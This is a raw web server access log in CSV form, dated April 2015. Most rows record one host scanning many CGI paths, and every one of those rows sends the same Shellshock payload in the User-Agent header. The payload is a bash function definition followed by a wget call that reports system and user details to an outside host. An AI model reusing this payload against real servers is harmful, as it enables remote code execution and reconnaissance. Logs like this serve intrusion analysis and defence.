"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"180.76.5.144","-","2015-04-12 18:02:30","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"54.173.156.105","-","2015-04-12 19:02:15","GMT-0700","HEAD","/",200,279,"-","-"
"54.145.120.119","-","2015-04-12 19:13:19","GMT-0700","GET","/",200,508,"-","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
"180.234.44.185","-","2015-04-12 19:27:08","GMT-0700","HEAD","/",200,279,"-","-"
"180.234.44.185","-","2015-04-12 19:27:09","GMT-0700","HEAD","/",200,279,"-","-"
"180.234.44.185","-","2015-04-12 19:27:11","GMT-0700","GET","/cgi-bin/",403,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:13","GMT-0700","GET","/cgi-sys/",404,530,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:14","GMT-0700","GET","/cgi-sys/entropysearch.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:14","GMT-0700","GET","/cgi-sys/FormMail-clone.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:15","GMT-0700","GET","/cgi-sys/suspendedpage.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:18","GMT-0700","GET","/tmUnblock.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:19","GMT-0700","GET","/gitweb/",404,529,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:20","GMT-0700","GET","/gitweb.cgi",404,532,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:20","GMT-0700","GET","/gitweb/gitweb.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:21","GMT-0700","GET","/cgi-bin/",403,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:22","GMT-0700","GET","/cgi-bin/php",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:23","GMT-0700","GET","/cgi-bin/php5",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:23","GMT-0700","GET","/cgi-bin/php4",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:25","GMT-0700","GET","/cgi-bin/php.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:26","GMT-0700","GET","/cgi-bin/firmwarecfg",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:27","GMT-0700","GET","/cgi-bin/%2f/admin.html",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:28","GMT-0700","GET","/cgi-bin/admin.html",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:29","GMT-0700","GET","/cgi-bin/test-cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:29","GMT-0700","GET","/sys-cgi",404,529,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:30","GMT-0700","GET","/dana-na/auth/url_default/welcome.cgi",404,558,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:31","GMT-0700","GET","/cgi-bin/tree.php",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:32","GMT-0700","GET","/cgi-bin/ICuGI/EST/blast_detail.cgi",404,556,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:32","GMT-0700","GET","/cgi-bin/hello",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:33","GMT-0700","GET","/cgi-sys/defaultwebpage.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:34","GMT-0700","GET","/cgi-bin/w3mman2html.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:35","GMT-0700","GET","/cgi-bin/status/status.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:36","GMT-0700","GET","/wwwboard/wwwboard.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:36","GMT-0700","GET","/wwwboard.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:38","GMT-0700","GET","/webtools/bonsai/showcheckins.cgi",404,554,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:39","GMT-0700","GET","/webtools/bonsai/cvsqueryform.cgi",404,554,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:40","GMT-0700","GET","/webtools/bonsai/cvsquery.cgi",404,550,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:43","GMT-0700","GET","/webtools/bonsai/ccvsblame.cgi",404,551,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:44","GMT-0700","GET","/Web_Store/web_store.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:46","GMT-0700","GET","/userreg.cgi",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:47","GMT-0700","GET","/upload.cgi",404,532,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:48","GMT-0700","GET","/tmUnblock.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:48","GMT-0700","GET","/test.cgi",404,530,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:49","GMT-0700","GET","/template.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:51","GMT-0700","GET","/submit.cgi",404,532,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:53","GMT-0700","GET","/site_searcher.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:53","GMT-0700","GET","/shop/normal_html.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:54","GMT-0700","GET","/shop/member_html.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:56","GMT-0700","GET","/setpasswd.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:57","GMT-0700","GET","/servers/link.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:57","GMT-0700","GET","/scancfg.cgi",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:58","GMT-0700","GET","/sampleposteddata.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:27:59","GMT-0700","GET","/sample04.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:00","GMT-0700","GET","/sample03.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:02","GMT-0700","GET","/sample01.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:04","GMT-0700","GET","/reviews/newpro.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:04","GMT-0700","GET","/redirects/redir.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:05","GMT-0700","GET","/quikstore.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:07","GMT-0700","GET","/pub/english.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:08","GMT-0700","GET","/process_bug.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:10","GMT-0700","GET","/photodata/manage.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:11","GMT-0700","GET","/photo/manage.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:12","GMT-0700","GET","/parse_xml.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:13","GMT-0700","GET","/page.cgi",404,530,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:14","GMT-0700","GET","/oem_webstage/cgi-bin/oemapp_cgi",404,553,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:15","GMT-0700","GET","/newpro.cgi",404,532,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:16","GMT-0700","GET","/ncbook.cgi",404,532,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:17","GMT-0700","GET","/musicqueue.cgi",404,536,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:17","GMT-0700","GET","/mods/apage/apage.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:18","GMT-0700","GET","/ministats/admin.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:19","GMT-0700","GET","/megabook/admin.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:20","GMT-0700","GET","/main.cgi",404,530,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:21","GMT-0700","GET","/mailview.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:21","GMT-0700","GET","/login.cgi",404,531,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:22","GMT-0700","GET","/left.cgi",404,530,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:23","GMT-0700","GET","/infosrch.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:24","GMT-0700","GET","/info.cgi",404,530,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:25","GMT-0700","GET","/index.cgi",404,531,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:26","GMT-0700","GET","/hndUnblock.cgi",404,536,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:27","GMT-0700","GET","/hitmatic/analyse.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:28","GMT-0700","GET","/Gozila.cgi",404,532,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:30","GMT-0700","GET","/ez2000/ezman.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:31","GMT-0700","GET","/ez2000/ezboard.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:31","GMT-0700","GET","/ez2000/ezadmin.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:32","GMT-0700","GET","/enter_bug.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:33","GMT-0700","GET","/emumail.cgi",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:34","GMT-0700","GET","/edittag/edittag.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:35","GMT-0700","GET","/download.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:36","GMT-0700","GET","/debug.cgi",404,531,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:37","GMT-0700","GET","/dcforum/dcforum.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:38","GMT-0700","GET","/dcforum.cgi",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:39","GMT-0700","GET","/dcboard.cgi",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:42","GMT-0700","GET","/CSNews.cgi",404,532,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:44","GMT-0700","GET","/cp/rac/nsManager.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:45","GMT-0700","GET","/connector.cgi",404,535,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:46","GMT-0700","GET","/cgis/wwwboard/wwwboard.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:47","GMT-0700","GET","/cgi-sys/signup.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:48","GMT-0700","GET","/cgi-sys/realsignup.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:49","GMT-0700","GET","/cgi-sys/realhelpdesk.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:50","GMT-0700","GET","/cgi-sys/randhtml.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:50","GMT-0700","GET","/cgi-sys/mchat.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:51","GMT-0700","GET","/cgi-sys/helpdesk.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:52","GMT-0700","GET","/cgi-sys/FormMail-clone.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:53","GMT-0700","GET","/cgi-sys/entropysearch.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:53","GMT-0700","GET","/cgi-sys/entropybanner.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:28:54","GMT-0700","GET","/cgi-sys/domainredirect.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
